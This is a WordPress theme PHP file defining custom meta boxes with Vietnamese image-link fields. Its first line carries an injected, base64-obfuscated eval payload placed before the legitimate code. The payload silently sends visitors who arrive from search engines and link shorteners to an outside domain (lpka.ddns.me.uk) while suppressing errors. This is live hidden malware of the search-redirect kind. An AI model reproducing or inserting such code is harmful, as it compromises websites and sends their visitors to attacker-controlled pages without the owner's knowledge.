<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9scGthLmRkbnMubWUudWsvIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));

/**

 * Registering meta boxes

 *

 */



/********************* BEGIN EXTENDING CLASS ***********************/



/**

 * Extend RW_Meta_Box class

 * Add field type: 'taxonomy'

 */

class RW_Meta_Box_Taxonomy extends RW_Meta_Box {

	

	function add_missed_values() {

		parent::add_missed_values();

		

		// add 'multiple' option to taxonomy field with checkbox_list type

		foreach ($this->_meta_box['fields'] as $key => $field) {

			if ('taxonomy' == $field['type'] && 'checkbox_list' == $field['options']['type']) {

				$this->_meta_box['fields'][$key]['multiple'] = true;

			}

		}

	}

	

	// show taxonomy list

	function show_field_taxonomy($field, $meta) {

		global $post;

		

		if (!is_array($meta)) $meta = (array) $meta;

		

		$this->show_field_begin($field, $meta);

		

		$options = $field['options'];

		$terms = get_terms($options['taxonomy'], $options['args']);

		

		// checkbox_list

		if ('checkbox_list' == $options['type']) {

			foreach ($terms as $term) {

				echo "<input type='checkbox' name='{$field['id']}[]' value='$term->slug'" . checked(in_array($term->slug, $meta), true, false) . " /> $term->name<br/>";

			}

		}

		// select

		else {

			echo "<select name='{$field['id']}" . ($field['multiple'] ? "[]' multiple='multiple' style='height:auto'" : "'") . ">";

		

			foreach ($terms as $term) {

				echo "<option value='$term->slug'" . selected(in_array($term->slug, $meta), true, false) . ">$term->name</option>";

			}

			echo "</select>";

		}

		

		$this->show_field_end($field, $meta);

	}

}



/********************* END EXTENDING CLASS ***********************/



/********************* BEGIN DEFINITION OF META BOXES ***********************/



// prefix of meta keys, optional

// use underscore (_) at the beginning to make keys hidden, for example $prefix = '_rw_';

// you also can make prefix empty to disable it

$prefix = 'indigo_';



$meta_boxes = array();



// first meta box

$meta_boxes[] = array(

	'id' => 'linkimg',							// meta box id, unique per meta box

	'title' => 'Link ảnh của bài viết',			// meta box title

	'pages' => array('post','page'),	// post types, accept custom post types as well, default is array('post'); optional

	'context' => 'normal',						// where the meta box appear: normal (default), advanced, side; optional

	'priority' => 'high',						// order of meta box: high (default), low; optional



	'fields' => array(	

    						// list of meta fields

		array(

			'name' => 'Link điều hướng',					// field name

			'desc' => 'Khi clik vào ảnh đối tác hoặc khách hàng link sẽ tới',	// field description, optional

			'id' => $prefix . 'link',				// field id, i.e. the meta key

			'type' => 'text',						// text box

		),	

		array(

			'name' => 'Link ảnh Màu',					// field name

			'desc' => 'Nhập link ảnh ở chế độ bình thường 180x80',	// field description, optional

			'id' => $prefix . 'mau',				// field id, i.e. the meta key

			'type' => 'text',						// text box

		),	

        array(

			'name' => 'Link ảnh Trắng',					// field name

			'desc' => 'Nhập link ảnh ở chế độ trỏ chuột 180x80',	// field description, optional

			'id' => $prefix . 'trang',				// field id, i.e. the meta key

			'type' => 'text',						// text box

		),

        array(

			'name' => 'Link ảnh trang chủ',					// field name

			'desc' => 'Nhập link ảnh ở trang chủ 240x100 chỉ dành cho sản phẩm',	// field description, optional

			'id' => $prefix . 'home',				// field id, i.e. the meta key

			'type' => 'text',						// text box

		),	

        array(

			'name' => 'Link ảnh trang trình bày',					// field name

			'desc' => 'Nhập link ảnh ở trang trình bày 295x185 (sản phẩm, khách hàng) hoặc 295x145(đối tác) bắt buộc',	// field description, optional

			'id' => $prefix . 'page',				// field id, i.e. the meta key

			'type' => 'text',						// text box

		),	

        
	)

);





foreach ($meta_boxes as $meta_box) {

	$my_box = new RW_Meta_Box_Taxonomy($meta_box);

}



/********************* END DEFINITION OF META BOXES ***********************/



/********************* BEGIN VALIDATION ***********************/



/**

 * Validation class

 * Define ALL validation methods inside this class

 * Use the names of these methods in the definition of meta boxes (key 'validate_func' of each field)

 */

class RW_Meta_Box_Validate {

	function check_name($text) {

		if ($text == 'Videonhac') {

			return 'videonhac.com';

		}

		return $text;

	}

}



/********************* END VALIDATION ***********************/

?>